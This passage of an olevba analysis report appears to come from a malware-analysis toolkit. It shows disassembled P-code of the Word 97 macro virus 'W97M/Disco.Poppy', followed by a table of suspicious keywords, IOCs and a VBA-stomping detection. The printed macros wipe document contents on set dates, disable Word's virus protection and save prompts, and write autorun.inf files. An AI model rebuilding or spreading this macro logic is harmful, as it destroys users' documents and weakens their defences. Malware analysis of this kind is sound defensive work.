' Line #49:
' 	LitVarSpecial (False)
' 	MemStWith SuggestFromMainDictionaryOnly 
' Line #50:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarWithSpelling 
' Line #51:
' 	LitVarSpecial (False)
' 	MemStWith ShowReadabilityStatistics 
' Line #52:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreUppercase 
' Line #53:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreMixedDigits 
' Line #54:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreInternetAndFileAddresses 
' Line #55:
' Line #56:
' 	EndWith 
' Line #57:
' Line #58:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #59:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #60:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #61:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #62:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x001D "Macro.Poppy.I aka Disco.Poppy"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #63:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #64:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x000C "By VicodinES"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #65:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #66:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0017 "Macro Virus for Word 97"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #67:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #68:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #69:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #70:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #71:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0029 "T h e   N a r k o t i c   N e t w o r k !"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #72:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #73:
' Line #74:
' 	ElseBlock 
' Line #75:
' Line #76:
' 	GoTo fuck1 
' Line #77:
' Line #78:
' 	EndIfBlock 
' Line #79:
' Line #80:
' 	Label fuck1 
' Line #81:
' Line #82:
' 	EndSub 
' Line #83:
' Macros/VBA/fileprint - 3308 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub fileprint())
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #4:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #6:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #7:
' Line #8:
' 	Dim 
' 	VarDefn D
' Line #9:
' 	Dim 
' 	VarDefn Ti
' Line #10:
' 	Dim 
' 	VarDefn Tp
' Line #11:
' 	Dim 
' 	VarDefn Z
' Line #12:
' Line #13:
' 	Ld Time 
' 	St Ti$ 
' Line #14:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #15:
' 	Ld Date 
' 	St D$ 
' Line #16:
' Line #17:
' 	LitDI2 0x0000 
' 	St Z 
' Line #18:
' Line #19:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #20:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #21:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #22:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #23:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #24:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #25:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #26:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #27:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #28:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #29:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #30:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #31:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #32:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #33:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #34:
' Line #35:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #36:
' Line #37:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #38:
' 	Ld wdScreen 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall MoveDown 0x0002 
' Line #39:
' 	Ld wdLine 
' 	ParamNamed Unit 
' 	Ld Selection 
' 	ArgsMemCall EndKey 0x0001 
' Line #40:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #41:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #42:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #43:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0034 "When will you wake up and realize that we live in a "
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #44:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0039 "primitive society? Don't kid yourself - there is NO GOD!!"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #45:
' Line #46:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #47:
' Line #48:
' Line #49:
' 	ElseBlock 
' Line #50:
' Line #51:
' 	Ld ActiveDocument 
' 	ArgsMemCall PrintOut 0x0000 
' Line #52:
' Line #53:
' 	EndIfBlock 
' Line #54:
' Line #55:
' 	EndSub 
' Line #56:
' Line #57:
' Line #58:
' Line #59:
' Line #60:
' Line #61:
' Line #62:
' Macros/VBA/FileTemplates - 3824 bytes
' Line #0:
' 	FuncDefn (Sub FileTemplates())
' Line #1:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #2:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #3:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #4:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #5:
' Line #6:
' 	Dim 
' 	VarDefn D
' Line #7:
' 	Dim 
' 	VarDefn Ti
' Line #8:
' 	Dim 
' 	VarDefn Tp
' Line #9:
' 	Dim 
' 	VarDefn Z
' Line #10:
' Line #11:
' 	Ld Time 
' 	St Ti$ 
' Line #12:
' 	LitStr 0x000B "12:00:01 PM"
' 	St Tp$ 
' Line #13:
' 	Ld Date 
' 	St D$ 
' Line #14:
' Line #15:
' 	LitDI2 0x0000 
' 	St Z 
' Line #16:
' Line #17:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #18:
' 	Ld Ti$ 
' 	Ld Tp$ 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #19:
' 	Ld D$ 
' 	LitStr 0x0007 "4/12/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #20:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #21:
' 	Ld D$ 
' 	LitStr 0x0007 "1/11/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #22:
' 	Ld D$ 
' 	LitStr 0x0007 "6/14/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #23:
' 	Ld D$ 
' 	LitStr 0x0007 "1/22/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #24:
' 	Ld D$ 
' 	LitStr 0x0007 "8/21/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #25:
' 	Ld D$ 
' 	LitStr 0x0007 "9/19/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #26:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #27:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #28:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/99"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #29:
' 	Ld D$ 
' 	LitStr 0x0007 "8/18/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #30:
' 	Ld D$ 
' 	LitStr 0x0006 "7/9/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #31:
' 	Ld D$ 
' 	LitStr 0x0008 "12/17/98"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St Z 
' 	EndIf 
' Line #32:
' Line #33:
' Line #34:
' 	Ld Z 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #35:
' Line #36:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #37:
' 	LitVarSpecial (False)
' 	MemStWith CheckSpellingAsYouType 
' Line #38:
' 	LitVarSpecial (False)
' 	MemStWith CheckGrammarAsYouType 
' Line #39:
' 	LitVarSpecial (False)
' 	MemStWith SuggestSpellingCorrections 
' Line #40:
' 	LitVarSpecial (False)
' 	MemStWith SuggestFromMainDictionaryOnly 
' Line #41:
' 	LitVarSpecial (True)
' 	MemStWith CheckGrammarWithSpelling 
' Line #42:
' 	LitVarSpecial (False)
' 	MemStWith ShowReadabilityStatistics 
' Line #43:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreUppercase 
' Line #44:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreMixedDigits 
' Line #45:
' 	LitVarSpecial (True)
' 	MemStWith IgnoreInternetAndFileAddresses 
' Line #46:
' Line #47:
' 	EndWith 
' Line #48:
' Line #49:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #50:
' 	Ld wdCharacter 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #51:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #52:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #53:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x001D "Macro.Poppy.I aka Disco.Poppy"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #54:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #55:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x000C "By VicodinES"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #56:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #57:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0017 "Macro Virus for Word 97"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #58:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #59:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #60:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #61:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #62:
' 	LineCont 0x0004 05 00 08 00
' 	LitStr 0x0029 "T h e   N a r k o t i c   N e t w o r k !"
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #63:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #64:
' Line #65:
' 	ElseBlock 
' Line #66:
' Line #67:
' 	GoTo fuck1 
' Line #68:
' Line #69:
' 	EndIfBlock 
' Line #70:
' Line #71:
' 	Label fuck1 
' Line #72:
' Line #73:
' Line #74:
' 	EndSub 
' Macros/VBA/FileExit - 1630 bytes
' Line #0:
' 	FuncDefn (Sub FileExit())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #3:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #4:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #5:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #6:
' Line #7:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #8:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #11:
' 	EndWith 
' Line #12:
' Line #13:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #14:
' Line #15:
' 	EndSub 
' Macros/VBA/HelpAbout - 1719 bytes
' Line #0:
' 	FuncDefn (Sub HelpAbout())
' Line #1:
' Line #2:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #3:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #4:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #5:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #6:
' Line #7:
' 	LitStr 0x0021 "  W97M/Disco.Poppy by VicodinES  "
' 	Ld vbOKOnly 
' 	LitStr 0x0018 " © The Narkotic Network "
' 	ArgsCall MsgBox 0x0003 
' Line #8:
' 	LitStr 0x0044 "Everything is fine - nothing to see here - let's move it along kids!"
' 	Ld vbExclamation 
' 	LitStr 0x002E " * VicodinES * Klonopin.Jones * Fastin.Blee * "
' 	ArgsCall MsgBox 0x0003 
' Line #9:
' 	LitStr 0x0026 "Social camouflage for this modern age!"
' 	Ld vbQuestion 
' 	LitStr 0x0007 "Slogan?"
' 	ArgsCall MsgBox 0x0003 
' Line #10:
' 	EndSub 
' Macros/VBA/Disco - 2759 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Sub dhIconDisco(strFile As String))
' Line #2:
' Line #3:
' 	QuoteRem 0x0000 0x0024 "Macro.Poppy.I aka "W97M/Disco.Poppy""
' Line #4:
' 	QuoteRem 0x0000 0x000C "By VicodinES"
' Line #5:
' 	QuoteRem 0x0000 0x0017 "Macro Virus for Word 97"
' Line #6:
' 	QuoteRem 0x0000 0x002B ""this is step one in the big understanding""
' Line #7:
' Line #8:
' Line #9:
' 	Dim 
' 	VarDefn Part1
' Line #10:
' 	Dim 
' 	VarDefn Part2
' Line #11:
' 	Dim 
' 	VarDefn Part22
' Line #12:
' 	Dim 
' 	VarDefn Part3
' Line #13:
' 	Dim 
' 	VarDefn Part33
' Line #14:
' 	Dim 
' 	VarDefn rn
' Line #15:
' 	Dim 
' 	VarDefn rnn
' Line #16:
' 	Dim 
' 	VarDefn Choice
' Line #17:
' 	Dim 
' 	VarDefn hFile (As Long)
' Line #18:
' Line #19:
' 	ArgsCall Read 0x0000 
' Line #20:
' Line #21:
' 	Ld Rnd 
' 	LitDI2 0x0002 
' 	Mul 
' 	FnInt 
' 	St Choice 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x0042 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0002 
' 	Add 
' 	St rnn$ 
' Line #23:
' 	Ld Rnd 
' 	LitDI2 0x001B 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St rn$ 
' Line #24:
' 	LitStr 0x0009 "[autorun]"
' 	St Part1$ 
' Line #25:
' 	LitStr 0x0024 "icon = c:\windows\system\pifmgr.dll,"
' 	St Part2$ 
' Line #26:
' 	LitStr 0x0025 "icon = c:\windows\SYSTEM\shell32.dll,"
' 	St Part22$ 
' Line #27:
' 	Ld Part2$ 
' 	Ld rn$ 
' 	Add 
' 	St Part3$ 
' Line #28:
' 	Ld Part22$ 
' 	Ld rnn$ 
' 	Add 
' 	St Part33$ 
' Line #29:
' Line #30:
' Line #31:
' 	Ld Friend 
' 	St hFile 
' Line #32:
' 	Ld strFile 
' 	Ld hFile 
' 	LitDefault 
' 	Open (For Output Access Write)
' Line #33:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part1$ 
' 	PrintItemNL 
' Line #34:
' 	Ld Choice 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #35:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part3$ 
' 	PrintItemNL 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	Ld Part33$ 
' 	PrintItemNL 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld hFile 
' 	Close 0x0001 
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autorun.inf         |Executable file name                         |
|IOC       |pifmgr.dll          |Executable file name                         |
|IOC       |shell32.dll         |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

